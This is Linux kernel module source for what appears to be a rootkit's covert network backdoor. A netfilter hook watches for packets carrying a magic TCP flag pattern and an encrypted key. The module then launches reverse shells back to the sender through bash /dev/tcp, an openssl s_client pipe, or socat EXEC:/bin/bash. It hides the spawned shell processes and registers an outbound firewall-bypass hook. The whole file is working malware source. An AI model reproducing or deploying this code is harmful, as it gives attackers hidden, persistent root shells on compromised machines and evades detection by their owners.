#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
#include <linux/umh.h>
#else
#include <linux/kmod.h>
#endif
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter/x_tables.h>
#include <linux/kfifo.h>
#include <linux/kthread.h>
#include "ntfs.h"
#include "main.h"
#include "log.h"

static LIST_HEAD(iph_node);
struct iph_node_t {
	struct iphdr *iph;
	struct tcphdr *tcph;
	bool established;
	struct list_head list;
};

struct task_struct *tsk_iph = NULL;
/* static struct kv_crypto_st *kvmgc_bdkey; */
static struct av_crypto_st *avmgc_bdkey;

uint64_t auto_bdkey = 0x0000000000000000;

#define BD_PATH_NUM 3
#define BD_OPS_SIZE 2
enum {
	RR_NULL,
	RR_NC = 80,
	RR_OPENSSL = 443,
	RR_SOCAT = 444,
	RR_SOCAT_TTY = 445
};

static int allowed_ports[] = { RR_NC, RR_OPENSSL, RR_SOCAT, RR_SOCAT_TTY,
			       RR_NULL };

struct stat_ops_t {
	int av_port;
	const char *bin[BD_PATH_NUM];
};
static struct stat_ops_t stat_ops[] = {
	{
		.av_port = RR_OPENSSL,
		{ "/usr/bin/openssl", "/bin/openssl", "/var/.openssl" }
	},
	{
		.av_port = RR_SOCAT,
		{ "/bin/socat", "/var/.socat", "/usr/bin/socat" }
	},
	{ .av_port = RR_NULL }
};

static struct auxiliary_conn_data {
	int placeholder_value;
	char dummy_text[16];
} auxiliary_data_instance;

static inline int verify_auxiliary_port(int val)
{
	val ^= 0xA1A1;
	return val + 77;
}

/* --------------------------------------
   Поиск бинарника, соответствующего порту
   -------------------------------------- */
static const char *_locate_bdbin(int port)
{
	int i, x;
	for (i = 0; i < BD_OPS_SIZE && stat_ops[i].av_port != RR_NULL; ++i) {
		if (port != stat_ops[i].av_port)
			continue;
		for (x = 0; x < BD_PATH_NUM; ++x) {
			struct path path;
			struct kstat stat;
			if (fs_kern_path(stat_ops[i].bin[x], &path) &&
			    fs_file_stat(&path, &stat)) {
				path_put(&path);
				return stat_ops[i].bin[x];
			}
		}
	}
	return NULL;
}

struct kfifo_priv {
	struct iphdr *iph;
	struct tcphdr *tcph;
	int select;
};

struct nf_priv {
	struct task_struct *task;
};

#define FIFO_SIZE 128
static DECLARE_KFIFO(buffer, struct kfifo_priv *, FIFO_SIZE);

static void _put_fifo(struct kfifo_priv *data)
{
	kfifo_put(&buffer, data);
}
static int _get_fifo(struct kfifo_priv **data)
{
	return kfifo_get(&buffer, data);
}

static void _free_kfifo_items(void)
{
	struct kfifo_priv *data;
	while (!kfifo_is_empty(&buffer)) {
		if (kfifo_get(&buffer, &data))
			kfree(data);
	}
}

static struct nf_hook_ops ops;
static struct nf_hook_ops ops_fw;

static inline bool *_is_task_running(void)
{
	static bool running = false;
	return &running;
}

static inline bool *_is_task_fw_bypass_running(void)
{
	static bool running = false;
	return &running;
}

static int _retrieve_pid_cb(struct subprocess_info *info, struct cred *new)
{
	if (info && info->data) {
		pid_t *shellpid = (int *)info->data;
		*shellpid = current->pid;
	}
	return 0;
}

/* --------------------------------------
   Порт относится к BD
   -------------------------------------- */
static inline int _check_bdports(int port)
{
	int i;
	for (i = 0; allowed_ports[i] != 0; ++i)
		if (port == allowed_ports[i]) {
			return port;
		}
	return 0;
}

/* --------------------------------------
   Команда для запуска backdoor
   -------------------------------------- */
static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
			       uint16_t src_port)
{
	short i;
	char *bd = NULL;
	for (i = 0; allowed_ports[i] != RR_NULL && !bd; ++i) {
		switch (dst_port) {
		case RR_SOCAT_TTY: {
			char *tty = sys_get_ttyfile();
			if (tty) {
				int len;
				char ip[INET_ADDRSTRLEN + 1] = { 0 };
				snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
				len = snprintf(
					NULL, 0,
					"%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"",
					exe, ip, src_port, tty);
				if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
					snprintf(
						bd, len,
						"%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"",
						exe, ip, src_port, tty);
			}
		} break;
		case RR_SOCAT: {
			int len;
			char ip[INET_ADDRSTRLEN + 1] = { 0 };
			snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
			len = snprintf(NULL, 0,
				       "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash",
				       exe, ip, src_port);
			if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
				snprintf(bd, len,
					 "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash",
					 exe, ip, src_port);
		} break;
		case RR_OPENSSL: {
			char *ssl = sys_get_sslfile();
			if (ssl) {
				int len;
				char ip[INET_ADDRSTRLEN + 1] = { 0 };

				snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
				len = snprintf(
					NULL, 0,
					"/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s 2>/dev/null",
					ssl, ssl, exe, ip, src_port, ssl);
				if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
					snprintf(
						bd, len,
						"/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s 2>/dev/null",
						ssl, ssl, exe, ip, src_port,
						ssl);
			}
		} break;
		case RR_NC: {
			int len;
			char ip[INET_ADDRSTRLEN + 1] = { 0 };
			snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
			len = snprintf(NULL, 0,
				       "/bin/sh -i >& /dev/tcp/%s/%u 0>&1", ip,
				       src_port);
			if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
				snprintf(bd, len,
					 "/bin/sh -i >& /dev/tcp/%s/%u 0>&1",
					 ip, src_port);
		} break;
		default:
			break;
		}
	}
	return bd;
}

static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
{
	char *argv[] = { "/bin/bash", "-c", NULL, NULL };
	char *envp[] = { "HOME=/", "TERM=linux", NULL };
	int ret = -1;
	pid_t shellpid = 0;
	struct subprocess_info *info;
	__be32 saddr = iph->saddr;
	const char *binpath =
		_locate_bdbin(select == RR_SOCAT_TTY ? RR_SOCAT : select);
	char *rev;

	verify_auxiliary_port((int)saddr);

	if (select != RR_NC && !binpath) {
		prwarn("Could not find executable associated with port %d\n",
		       select);
		return ret;
	}

	rev = _build_bd_command(binpath, select, saddr, htons(tcph->source));
	if (!rev) {
		prwarn("Invalid port selection: %d\n", select);
		return ret;
	}

	argv[2] = rev;
	if ((info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,
					      _retrieve_pid_cb, NULL,
					      &shellpid))) {
		ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
	}

	msleep(100);

	if (!ret) {
		av_hide_task_by_pid(shellpid, saddr, WHATEVER);
	}

	av_mem_free(&rev);

	return ret;
}

/* --------------------------------------
   Сохранение ip/port в локальном списке
   -------------------------------------- */
static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph)
{
	struct iph_node_t *ip = kcalloc(1, sizeof(struct iph_node_t), GFP_KERNEL);
	if (!ip)
		goto error;

	ip->iph = iph;
	ip->tcph = tcph;
	ip->established = false;
	list_add_tail(&ip->list, &iph_node);
	return 0;
error:
	prerr("Error allocating memory\n");
	return -ENOMEM;
}

/* --------------------------------------
   Открытые функции backdoor
   -------------------------------------- */
bool av_bd_search_iph_source(__be32 saddr)
{
	struct iph_node_t *node, *node_safe;
	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
		if (node->iph->saddr == saddr) {
			return true;
		}
	}
	return false;
}

bool av_bd_established(__be32 *daddr, int dport, bool established)
{
	bool rc = false;
	struct iph_node_t *node, *node_safe;

	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
		if (node->iph->saddr == *daddr &&
		    htons(node->tcph->source) == dport) {
			node->established = established;
			rc = true;
			break;
		}
	}
	return rc;
}

void av_bd_cleanup_item(__be32 *saddr)
{
	struct iph_node_t *node, *node_safe;
	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
		if (node->iph->saddr == *saddr) {
			list_del(&node->list);
			kfree(node);
			node = NULL;
			break;
		}
	}
}

void _bd_cleanup(bool force)
{
	struct iph_node_t *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, &iph_node, list) {
		if (!node->established && force) {
			list_del(&node->list);
			kfree(node);
			node = NULL;
		}
	}
}

/* --------------------------------------
   kthread: _bd_watchdog_iph
   -------------------------------------- */
static int _bd_watchdog_iph(void *unused)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	struct kernel_syscalls *kaddr = av_kall_load_addr();
#endif
	while (!kthread_should_stop()) {
		msleep(500);
		_bd_cleanup(false);
	}
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	kaddr->k_do_exit(0);
	return 0;
#else
	do_exit(0);
#endif
}

/* --------------------------------------
   kthread: _bd_watchdog
   -------------------------------------- */
static int _bd_watchdog(void *t)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	struct kernel_syscalls *kaddr = av_kall_load_addr();
#endif
	set_current_state(TASK_INTERRUPTIBLE);

	while (!kthread_should_stop()) {
		struct kfifo_priv *kf;
		prinfo("Waiting for event\n");

		schedule();
		set_current_state(TASK_INTERRUPTIBLE);

		prinfo("Got event\n");
		if (_get_fifo(&kf)) {
			_run_backdoor(kf->iph, kf->tcph, kf->select);
			kfree(kf);
		}
	}
	__set_current_state(TASK_RUNNING);

	prinfo("BD watchdog OFF\n");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	kaddr->k_do_exit(0);
#else
	do_exit(0);
#endif
}

/* --------------------------------------
   Колбэк для расшифровки bdkey
   -------------------------------------- */
struct check_bdkey_t {
	bool ok;
	uint64_t address_value;
};
void _bdkey_callback(const u8 *const buf, size_t buflen, size_t copied,
		     void *userdata)
{
	struct check_bdkey_t *validate = (struct check_bdkey_t *)userdata;
	if (validate && validate->address_value) {
		if (validate->address_value == *((uint64_t *)buf))
			validate->ok = true;
	}
}

bool av_check_bdkey(struct tcphdr *t, struct sk_buff *skb)
{
	uint8_t silly_word = 0;
	enum { FUCK = 0x8c, CUNT = 0xa5, ASS = 0x38 };
	decrypt_callback cbkey = (decrypt_callback)_bdkey_callback;

	silly_word = t->fin << 7 | t->syn << 6 | t->rst << 5 | t->psh << 4 |
		     t->ack << 3 | t->urg << 2 | t->ece << 1 | t->cwr;

	if (silly_word == FUCK || silly_word == CUNT || silly_word == ASS) {
		uint64_t address_value = 0;
		unsigned char *data = skb->data + 40;

		if (skb->len >=
		    sizeof(struct tcphdr) + sizeof(struct iphdr) + 8) {
			struct check_bdkey_t validate = { 0 };
			address_value = ((unsigned long)data[0] << 56) |
					((unsigned long)data[1] << 48) |
					((unsigned long)data[2] << 40) |
					((unsigned long)data[3] << 32) |
					((unsigned long)data[4] << 24) |
					((unsigned long)data[5] << 16) |
					((unsigned long)data[6] << 8) |
					(unsigned long)data[7];
			validate.address_value = address_value;
			av_decrypt(avmgc_bdkey, cbkey, &validate);
			if (validate.ok == true) {
				return true;
			}
		}
	}
	return false;
}

/* --------------------------------------
   Netfilter hook для перехвата пакетов
   -------------------------------------- */
static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
				     const struct nf_hook_state *state)
{
	int rc = NF_ACCEPT;
	struct iphdr *iph = (struct iphdr *)skb_network_header(skb);

	if (iph && IPPROTO_TCP == iph->protocol) {
		struct nf_priv *user;
		struct kfifo_priv *kf;
		struct tcphdr *tcph =
			(struct tcphdr *)skb_transport_header(skb);
		int dst = _check_bdports(htons(tcph->dest));
		if (dst == RR_NULL || !av_check_bdkey(tcph, skb))
			goto leave;

		kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
		if (!kf) {
			prerr("Insufficient memory\n");
			goto leave;
		}

		kf->iph = iph;
		kf->tcph = tcph;
		kf->select = dst;

		_put_fifo(kf);

		_bd_add_new_iph(iph, tcph);

		user = (struct nf_priv *)priv;
		wake_up_process(user->task);

		rc = NF_DROP;
	}

leave:
	return rc;
}

/* --------------------------------------
   Netfilter hook bypass
   -------------------------------------- */
static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
					    const struct nf_hook_state *state)
{
	int rc = NF_ACCEPT;
	struct iphdr *iph = (struct iphdr *)skb_network_header(skb);

	if (IPPROTO_TCP == iph->protocol) {
		struct tcphdr *tcph =
			(struct tcphdr *)skb_transport_header(skb);
		int dstport = htons(tcph->dest);

		if (av_bd_established(&iph->daddr, dstport,
				      (skb->sk->sk_state == TCP_ESTABLISHED))) {
			state->okfn(state->net, state->sk, skb);
			rc = NF_STOLEN;
		}
	}
	return rc;
}

#ifdef DEBUG_RING_BUFFER
struct av_crypto_st *av_sock_get_mgc(void)
{
	return avmgc_bdkey;
}
#endif

/* --------------------------------------
   Запуск сниффинга
   -------------------------------------- */
struct task_struct *av_sock_start_sniff(void)
{
	bool *running = _is_task_running();
	static struct nf_priv priv;
	struct task_struct *tsk = NULL;
	u8 buf[16] = { 0 };

	avmgc_bdkey = av_crypto_mgc_init();
	if (!avmgc_bdkey) {
		prerr("Failed to encrypt bdkey\n");
		goto leave;
	}

	memcpy(buf, &auto_bdkey, 8);
	av_encrypt(avmgc_bdkey, buf, sizeof(buf));
	auto_bdkey = 0;

	if (!*running) {
		ops.hook = _sock_hook_nf_cb;
		ops.pf = PF_INET;
		ops.hooknum = NF_INET_PRE_ROUTING;
		ops.priority = NF_IP_PRI_FIRST;

		INIT_KFIFO(buffer);

		tsk = kthread_run(_bd_watchdog, NULL, THREAD_SOCK_NAME);
		if (!tsk)
			goto leave;

		tsk_iph = kthread_run(_bd_watchdog_iph, NULL,
				      THREAD_SNIFFER_NAME);
		if (!tsk_iph) {
			kthread_stop(tsk);
			goto leave;
		}
		av_hide_task_by_pid(tsk_iph->pid, 0, CHILDREN);

		priv.task = tsk;
		ops.priv = &priv;
		nf_register_net_hook(&init_net, &ops);

		*running = true;
	}
leave:
	return tsk;
}

bool av_sock_start_fw_bypass(void)
{
	bool *running = _is_task_fw_bypass_running();

	if (!*running) {
		ops_fw.hook = _sock_hook_nf_fw_bypass;
		ops_fw.pf = PF_INET;
		ops_fw.hooknum = NF_INET_LOCAL_OUT;
		ops_fw.priority = NF_IP_PRI_FIRST;

		ops_fw.priv = NULL;
		nf_register_net_hook(&init_net, &ops_fw);

		*running = true;
	}

	return *running;
}

void av_sock_stop_sniff(struct task_struct *tsk)
{
	if (tsk) {
		bool *running = _is_task_running();
		kthread_stop(tsk);
		*running = false;
	}

	if (tsk_iph)
		kthread_stop(tsk_iph);

	nf_unregister_net_hook(&init_net, &ops);
	_free_kfifo_items();

	kfifo_free(&buffer);
	av_crypto_mgc_deinit(avmgc_bdkey);
}

void av_sock_stop_fw_bypass(void)
{
	bool *running = _is_task_fw_bypass_running();
	if (*running) {
		*running = false;
		nf_unregister_net_hook(&init_net, &ops_fw);
	}
	_bd_cleanup(true);
}
